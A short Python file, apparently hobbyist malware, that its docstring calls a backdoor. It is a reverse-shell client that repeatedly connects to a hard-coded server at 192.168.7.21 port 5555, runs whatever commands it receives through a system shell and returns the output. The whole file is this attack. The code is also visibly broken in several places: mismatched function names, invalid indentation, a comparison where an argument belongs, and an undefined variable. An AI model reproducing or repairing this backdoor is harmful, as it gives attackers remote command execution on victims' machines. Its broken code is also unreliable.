import socket
import time
import json
import subprocess

def reliable_send(data):   
        jsondata = json.dumps(data)
        s1.send(jsondata.encode())

def reliable_rcv(): 
        data=''
        while True: 
                try:
                        data += s1.recv(1024).decode().rstrip()
                        return json.loads(data) 
                except ValueError: 
                        continue 


def Connecting():
"""
This Function should be kinaof self explanetory, but her main objective is to connect this backdoor to our server side of the payload.
For your own systems you need to change the first argument in s1.connect for your own oporating OP machine 
"""
	while True:
		time.sleep(20) #This loop will try every 20 seconds to connect to our machine if connetion is achived loop will brake, otherwise its an infinit loop.
		try:
			s1.connect(('192.168.7.21',5555))
			shell()
			s1.close()
			break 
		except:
			connection()


def shell():
	while True:
		command = reliable_rcv()
		if command =='quit':
			break
		else:
		execute = subprocess.Popen(command, shell==True, stdout=subprocess.PIPE, stderr=subprocess.PIPE , stdin=subprocess.PIPE  )
		result = execute.stdout.read() + stderr.read()
		result = result.decode()
		reliable_send()
		#exec the command

s1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connecting()
